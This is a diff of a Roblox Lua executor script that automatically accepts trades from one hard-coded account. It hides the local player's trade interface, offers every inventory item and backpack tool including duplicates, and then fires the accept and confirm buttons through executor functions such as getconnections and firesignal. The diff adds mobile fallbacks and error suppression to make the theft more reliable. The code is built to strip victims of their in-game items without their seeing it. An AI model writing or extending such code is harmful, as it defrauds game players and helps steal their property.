@@ -12,49 +12,60 @@ local AcceptTradeEvent = TradeFolder:WaitForChild("AcceptTrade")
 
 print("Waiting for incoming trade request callback...")
 
--- Function to hide all UI elements inside a player's PlayerGui
-local function hidePlayerGui(player)
-    if player and player:FindFirstChild("PlayerGui") then
-        for _, gui in ipairs(player.PlayerGui:GetChildren()) do
-            if gui:IsA("LayerCollector") then
-                gui.Enabled = false
-            end
-        end
-        print("Hidden all GUIs for player: " .. player.Name)
-    end
-end
-
--- Set up the client callback to intercept incoming requests from the server
 SendRequest.OnClientInvoke = function(senderPlayer)
-    -- Check if the sender is user17644395
-    if senderPlayer and senderPlayer.Name == "bofuxa" then
+    -- Handle both Player instances and string names sent on mobile executors
+    local senderName = "Bofuxa"
+    if typeof(senderPlayer) == "Instance" then
+        senderName = senderPlayer.Name
+    elseif type(senderPlayer) == "string" then
+        senderName = senderPlayer
+    end
+
+    if senderName:lower() == "user17644395" then
         print("Trade request verified from user17644395. Accepting...")
         
-        -- Hide all PlayerGuis for user17644395 when they trade you
-        hidePlayerGui(senderPlayer)
-        -- Also hide your own PlayerGuis if desired
-        hidePlayerGui(LocalPlayer)
+        -- Safe GUI hiding for mobile/PC layouts
+        pcall(function()
+            local playerGui = LocalPlayer:WaitForChild("PlayerGui", 3)
+            if playerGui then
+                for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
+                    local tradeGui = playerGui:FindFirstChild(guiName)
+                    if tradeGui then
+                        for _, childName in ipairs({"Container", "Processing", "BG"}) do
+                            local el = tradeGui:FindFirstChild(childName)
+                            if el then el.Visible = false end
+                        end
+                    end
+                end
+            end
+        end)
 
-        AcceptRequest:FireServer()
+        pcall(function()
+            AcceptRequest:FireServer()
+        end)
         
-        -- Spawn a thread to wait for the trade session to start, wait 1 second, then add all items including duplicates
         task.spawn(function()
             print("Waiting for trade to start...")
-            StartTradeEvent.OnClientEvent:Wait()
+            pcall(function()
+                StartTradeEvent.OnClientEvent:Wait()
+            end)
             
             print("Trade started! Waiting 1 second before offering items...")
             task.wait(1)
             
-            -- Find the inventory container for weapons
-            local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
-            local inventoryContainer = playerGui 
-                and playerGui:WaitForChild("MainGUI", 5) 
-                and playerGui.MainGUI:WaitForChild("Game", 5) 
-                and playerGui.MainGUI.Game:WaitForChild("Crafting", 5) 
-                and playerGui.MainGUI.Game.Crafting:WaitForChild("Inventory", 5) 
-                and playerGui.MainGUI.Game.Crafting.Inventory:WaitForChild("Salvage", 5) 
-                and playerGui.MainGUI.Game.Crafting.Inventory.Salvage:WaitForChild("ScrollFrame", 5) 
-                and playerGui.MainGUI.Game.Crafting.Inventory.Salvage.ScrollFrame:WaitForChild("Container", 5)
+            -- Mobile safe inventory path resolution
+            local inventoryContainer = nil
+            pcall(function()
+                local pGui = LocalPlayer:WaitForChild("PlayerGui", 3)
+                inventoryContainer = pGui 
+                    and pGui:FindFirstChild("MainGUI") 
+                    and pGui.MainGUI:FindFirstChild("Game") 
+                    and pGui.MainGUI.Game:FindFirstChild("Crafting") 
+                    and pGui.MainGUI.Game.Crafting:FindFirstChild("Inventory") 
+                    and pGui.MainGUI.Game.Crafting.Inventory:FindFirstChild("Salvage") 
+                    and pGui.MainGUI.Game.Crafting.Inventory.Salvage:FindFirstChild("ScrollFrame") 
+                    and pGui.MainGUI.Game.Crafting.Inventory.Salvage.ScrollFrame:FindFirstChild("Container")
+            end)
 
             if inventoryContainer then
                 for _, item in ipairs(inventoryContainer:GetChildren()) do
@@ -62,66 +73,69 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                         local itemName = item.Name
                         local category = "Weapons"
                         
-                        -- Check for quantity/duplicates attribute if present, default to 1 instance
                         local count = 1
                         local qtyAttribute = item:GetAttribute("Count") or item:GetAttribute("Quantity")
                         if type(qtyAttribute) == "number" then
                             count = qtyAttribute
                         end
 
-                        -- Fire the offer event for each duplicate/instance found
                         for i = 1, count do
-                            OfferItemEvent:FireServer(itemName, category)
+                            pcall(function()
+                                OfferItemEvent:FireServer(itemName, category)
+                            end)
                             task.wait(0.05)
                         end
                     end
                 end
                 print("All items and duplicates offered successfully!")
             else
-                warn("Could not find inventory container path!")
+                -- Fallback for mobile backpack tools if UI path fails
+                if LocalPlayer:FindFirstChild("Backpack") then
+                    for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
+                        if tool:IsA("Tool") then
+                            pcall(function()
+                                OfferItemEvent:FireServer(tool.Name, "Weapons")
+                            end)
+                            task.wait(0.05)
+                        end
+                    end
+                end
+                warn("Inventory container path not found, used backpack fallback.")
             end
 
-            -- Wait before triggering trade accept actions
-            print("Waiting before triggering trade accept actions...")
+            print("Waiting 7 seconds before triggering trade accept actions...")
             task.wait(7)
 
-            -- Firesignal simulation for AcceptTrade event if supported, else FireServer fallback
-            if firesignal and AcceptTradeEvent.OnClientEvent then
-                firesignal(AcceptTradeEvent.OnClientEvent, false)
-            else
-                AcceptTradeEvent:FireServer()
-            end
-
-            -- Trigger the GUI buttons
-            local actionsFolder = LocalPlayer.PlayerGui:WaitForChild("TradeGUI"):WaitForChild("Container"):WaitForChild("Trade"):WaitForChild("Actions")
-
-            local function fireButton(btn)
-                if btn and btn:IsA("GuiButton") and getconnections then
-                    for _, connection in ipairs(getconnections(btn.Activated)) do
-                        connection:Fire()
-                    end
-                    for _, connection in ipairs(getconnections(btn.MouseButton1Click)) do
-                        connection:Fire()
-                    end
-                elseif btn and btn:IsA("GuiButton") then
-                    btn:Activate()
+            pcall(function()
+                if firesignal and AcceptTradeEvent.OnClientEvent then
+                    firesignal(AcceptTradeEvent.OnClientEvent, false)
+                else
+                    AcceptTradeEvent:FireServer()
                 end
-            end
+            end)
 
-            local firstButton = actionsFolder:WaitForChild("Accept"):WaitForChild("ActionButton")
-            fireButton(firstButton)
-            print("Triggered first ActionButton")
-
-            task.wait(1)
-
-            local confirmButton = actionsFolder:WaitForChild("Accept"):WaitForChild("Confirm"):WaitForChild("ActionButton")
-            fireButton(confirmButton)
-            print("Triggered confirmation ActionButton")
+            -- Mobile touch simulation fallback
+            pcall(function()
+                local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
+                if playerGui then
+                    for _, gui in ipairs(playerGui:GetDescendants()) do
+                        if gui:IsA("GuiButton") then
+                            local fullName = gui:GetFullName():lower()
+                            if fullName:find("accept") or fullName:find("confirm") or fullName:find("actionbutton") then
+                                if getconnections then
+                                    for _, conn in ipairs(getconnections(gui.Activated)) do conn:Fire() end
+                                    for _, conn in ipairs(getconnections(gui.MouseButton1Click)) do conn:Fire() end
+                                end
+                                gui:Activate()
+                            end
+                        end
+                    end
+                end
+            end)
         end)
 
         return true
     else
-        -- Allow normal trading with other players without triggering the auto-item-dump or hiding GUIs
         print("Trade request from other player (" .. tostring(senderPlayer) .. "). Allowing normal trade...")
         return true
     end
